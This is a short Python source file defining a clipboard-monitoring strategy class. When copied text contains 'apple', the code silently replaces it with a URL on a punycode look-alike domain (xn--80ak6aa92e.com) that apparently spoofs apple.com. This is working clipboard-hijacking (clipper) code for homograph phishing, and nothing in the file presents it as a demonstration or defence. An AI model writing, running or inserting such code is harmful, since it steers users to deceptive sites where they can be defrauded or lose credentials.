import re

import clipboard

from model.event_type import EventType
from strategies.handler import AbstractStrategy


class UrlStrategy(AbstractStrategy):
    def can_handle(self, text: str, event_type: EventType) -> bool:
        return text != "" and (event_type == EventType.ON_UPDATED_TEXT or event_type == EventType.ON_KEYBOARD_COPY)

    def process_text(self, text: str, window_title: str, event_type: EventType) -> None:
        if "apple" in text:
            text_list: list = text.split(".com")
            clipboard.copy("https://www.xn--80ak6aa92e.com" + text_list[1])
